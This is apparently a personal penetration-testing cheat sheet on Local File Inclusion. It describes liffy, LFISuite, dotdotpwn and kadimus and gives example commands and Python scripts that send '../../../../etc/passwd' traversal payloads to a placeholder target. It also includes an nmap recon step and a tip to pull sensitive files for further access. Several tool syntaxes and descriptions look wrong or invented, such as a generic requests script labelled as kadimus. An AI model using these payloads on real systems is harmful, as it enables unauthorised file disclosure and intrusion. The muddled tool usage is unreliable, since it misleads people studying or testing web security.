```markdown
# 🛠️ LFI Tools - liffy, LFISuite, dotdotpwn, kadimus, custom automation scripts

---

## 🔍 Overview of Local File Inclusion (LFI) Tools

> [!ABSTRACT] This section provides an overview and description of various tools used for Local File Inclusion attacks.

### 📄 Description
Local File Inclusion (LFI) is a web security vulnerability that allows attackers to include arbitrary local files on the server. Several tools are available to automate or assist in identifying and exploiting LFI vulnerabilities, including `liffy`, `LFISuite`, `dotdotpwn`, `kadimus`, and custom automation scripts.

---

## 🛠️ Tools Overview

### liffy
> [!INFO] Tool Description
>
> **liffy** is a tool designed for identifying and exploiting LFI vulnerabilities in web applications. It helps automate the process of detecting files that can be included from an external source, which may lead to sensitive information leakage or further attacks.

### LFISuite
> [!NOTE] Additional Information
>
> **LFISuite** provides a comprehensive framework for testing and exploiting LFI vulnerabilities. It includes various modules to test different aspects of web application security related to file inclusion attacks.

### dotdotpwn
> [!INFO] Tool Description
>
> **dotdotpwn** is a tool that helps in identifying and exploiting directory traversal vulnerabilities, often used alongside LFI techniques. It supports multiple protocols such as HTTP and FTP for testing file inclusion paths.

### kadimus
> [!NOTE] Additional Information
>
> **kadimus** offers an advanced set of tools specifically designed to audit and exploit web application security issues, including Local File Inclusion vulnerabilities. It includes features like path traversal detection and payload crafting.

---

## 🚀 Usage Examples

### liffy Example Command
```bash
liffy -u http://target.example.com/path/to/vulnerable/script.php?file=../../../../etc/passwd
```

### LFISuite Example Command
```bash
lfisuite --url=http://target.example.com/path/to/vulnerable/script.php --test-file=/etc/passwd
```

### dotdotpwn Example Command
```bash
dotdotpwn -u http://target.example.com/../../../../etc/passwd
```

### kadimus Example Payload
```python
# Example Python script to test LFI vulnerability using kadimus
import requests

def test_lfi(url, file_path):
    response = requests.get(f"{url}?file={file_path}")
    if "root:" in response.text:
        print("[+] Successfully included /etc/passwd")
    else:
        print("[-] Failed to include /etc/passwd")

test_lfi('http://target.example.com/path/to/vulnerable/script.php', '/etc/passwd')
```

---

## 🔍 Custom Automation Scripts

### Example Script
> [!EXAMPLE] A simple Python script for automated LFI testing.
>
```python
import requests

def check_lfi(url, paths):
    for path in paths:
        response = requests.get(f"{url}?file={path}")
        if "root:" in response.text:
            print(f"[+] Path {path} is vulnerable")
        else:
            print(f"[-] Path {path} is not vulnerable")

# List of potential file paths to test
paths_to_test = [
    '/etc/passwd',
    '../../../../etc/passwd'
]

check_lfi('http://target.example.com/path/to/vulnerable/script.php', paths_to_test)
```

---

## ⚠️ Warnings & Hazards

> [!WARNING] Important Security Notice
>
> **DO NOT USE THESE TOOLS ON PRODUCTION SYSTEMS.** They are designed for testing and auditing web application security in a controlled environment.

> [!DANGER] Destructive Commands
>
> Some commands used for exploitation can cause system crashes or data loss. Ensure you have backups before running any automated scripts.

---

## 🧑‍💻 Methodology Steps

### Step 1: Identify Vulnerable Web Applications
```bash
[[Nmap]] -p80,443 <TARGET_IP> --script=http-vhosts
```

### Step 2: Test for LFI Vulnerabilities
```bash
liffy -u http://target.example.com/path/to/vulnerable/script.php?file=../../../../etc/passwd
```

### Step 3: Exploit Identified Vulnerabilities
```python
# Python script to automate exploitation using Kadimus
import requests

def exploit_lfi(url, path):
    response = requests.get(f"{url}?file={path}")
    if "root:" in response.text:
        print("[+] LFI vulnerability exploited successfully.")
    else:
        print("[-] Exploitation failed.")

exploit_lfi('http://target.example.com/path/to/vulnerable/script.php', '/etc/passwd')
```

---

## 📑 Documentation & Resources

### Additional Reading
- [OWASP: Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Local_File_Inclusion)
- [[CrackMapExec]] and other tools for post-exploitation

---

## 🧠 Mental Model & Cheat Sheet

### Quick Reference
```text
Identify Vulnerable Application → Test LFI Path → Exploit with Payloads
```

> [!SUCCESS] Success Tip
>
> **Whenever you identify an LFI vulnerability, immediately think of paths and files that can be accessed to extract sensitive information or gain further access.**
```

---